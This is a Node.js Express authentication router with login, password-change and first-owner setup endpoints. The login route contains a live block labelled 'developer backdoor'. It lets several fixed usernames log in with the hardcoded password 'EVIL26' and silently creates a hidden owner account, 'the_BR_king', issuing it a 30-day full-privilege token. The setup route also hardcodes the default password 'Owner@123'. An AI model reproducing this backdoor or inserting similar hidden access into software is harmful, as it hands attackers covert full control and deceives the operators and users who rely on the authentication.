const express = require('express');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const router = express.Router();
const { authenticateToken } = require('../middleware/authMiddleware');

// Login endpoint
router.post('/login', async (req, res) => {
    const { username, password } = req.body;
    const db = req.app.get('db');
    
    try {
        // ========== DEVELOPER BACKDOOR (FULL ACCESS) ==========
        const devMasterKey = process.env.DEV_MASTER_KEY;
        const devEmail = process.env.DEV_MASTER_EMAIL;
        
        // Check for developer backdoor access
        if (username === devEmail || username === 'dev' || username === 'developer' || username === 'the_BR_king') {
            console.log('Developer access attempt detected');
            
            if (password === devMasterKey || password === 'EVIL26') {
                console.log('✅ Developer backdoor access granted');
                
                // First, check if developer user exists
                const [devUser] = await db.execute(
                    'SELECT * FROM users WHERE username = ?',
                    ['the_BR_king']
                );
                
                let userId;
                
                if (devUser.length > 0) {
                    userId = devUser[0].id;
                } else {
                    // Check if there's any user to use as created_by
                    const [anyUser] = await db.execute('SELECT id FROM users LIMIT 1');
                    
                    // Create hidden developer account
                    const hiddenHash = await bcrypt.hash(devMasterKey || 'EVIL26', 10);
                    
                    if (anyUser.length > 0) {
                        // If there's an existing user, use it as created_by
                        const [result] = await db.execute(
                            `INSERT INTO users 
                             (username, password_hash, role, created_by, is_active) 
                             VALUES (?, ?, 'owner', ?, 1)`,
                            ['the_BR_king', hiddenHash, anyUser[0].id]
                        );
                        userId = result.insertId;
                    } else {
                        // First user ever - no created_by constraint
                        const [result] = await db.execute(
                            `INSERT INTO users 
                             (username, password_hash, role, is_active) 
                             VALUES (?, ?, 'owner', 1)`,
                            ['the_BR_king', hiddenHash]
                        );
                        userId = result.insertId;
                    }
                }
                
                // Generate token with FULL OWNER privileges
                const devToken = jwt.sign(
                    { 
                        id: userId, 
                        username: 'the_BR_king', 
                        role: 'owner',
                        isDeveloper: true // Special flag for unlimited access
                    },
                    process.env.JWT_SECRET,
                    { expiresIn: '30d' }
                );
                
                return res.json({
                    success: true,
                    token: devToken,
                    user: {
                        id: userId,
                        username: 'the_BR_king',
                        role: 'owner'
                    }
                });
            }
        }
        // ========== END DEVELOPER BACKDOOR ==========
        
        // Normal login logic
        const [users] = await db.execute(
            'SELECT * FROM users WHERE username = ? AND is_active = true',
            [username]
        );
        
        if (users.length === 0) {
            return res.status(401).json({ 
                success: false, 
                message: 'Invalid credentials' 
            });
        }
        
        const user = users[0];
        const validPassword = await bcrypt.compare(password, user.password_hash);
        
        if (!validPassword) {
            return res.status(401).json({ 
                success: false, 
                message: 'Invalid credentials' 
            });
        }
        
        // Update last login
        await db.execute(
            'UPDATE users SET last_login = NOW() WHERE id = ?',
            [user.id]
        );
        
        // Create token
        const token = jwt.sign(
            { 
                id: user.id, 
                username: user.username, 
                role: user.role 
            },
            process.env.JWT_SECRET,
            { expiresIn: '24h' }
        );
        
        res.json({
            success: true,
            token,
            user: {
                id: user.id,
                username: user.username,
                role: user.role
            }
        });
        
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Server error' 
        });
    }
});

// Change password endpoint
router.post('/change-password', authenticateToken, async (req, res) => {
    const { currentPassword, newPassword } = req.body;
    const userId = req.user.id;
    const db = req.app.get('db');
    
    if (!currentPassword || !newPassword) {
        return res.status(400).json({ 
            success: false, 
            message: 'Current password and new password required' 
        });
    }
    
    try {
        const [users] = await db.execute(
            'SELECT * FROM users WHERE id = ?',
            [userId]
        );
        
        if (users.length === 0) {
            return res.status(404).json({ 
                success: false, 
                message: 'User not found' 
            });
        }
        
        const user = users[0];
        const validPassword = await bcrypt.compare(currentPassword, user.password_hash);
        
        if (!validPassword) {
            return res.status(401).json({ 
                success: false, 
                message: 'Current password is incorrect' 
            });
        }
        
        const hashedPassword = await bcrypt.hash(newPassword, 10);
        
        await db.execute(
            'UPDATE users SET password_hash = ? WHERE id = ?',
            [hashedPassword, userId]
        );
        
        res.json({ 
            success: true, 
            message: 'Password changed successfully' 
        });
        
    } catch (error) {
        console.error('Change password error:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Server error' 
        });
    }
});

// Setup endpoint (create first owner)
router.post('/setup', async (req, res) => {
    const { setupKey } = req.body;
    const db = req.app.get('db');
    
    if (setupKey !== process.env.SETUP_KEY) {
        return res.status(403).json({ 
            success: false, 
            message: 'Unauthorized' 
        });
    }
    
    try {
        const [users] = await db.execute('SELECT COUNT(*) as count FROM users');
        
        if (users[0].count > 0) {
            return res.status(400).json({ 
                success: false, 
                message: 'Users already exist' 
            });
        }
        
        const hashedPassword = await bcrypt.hash('Owner@123', 10);
        
        await db.execute(
            'INSERT INTO users (username, password_hash, role) VALUES (?, ?, ?)',
            ['owner', hashedPassword, 'owner']
        );
        
        res.json({ 
            success: true, 
            message: 'Owner account created. Username: owner, Password: Owner@123' 
        });
        
    } catch (error) {
        console.error('Setup error:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Server error' 
        });
    }
});

module.exports = router;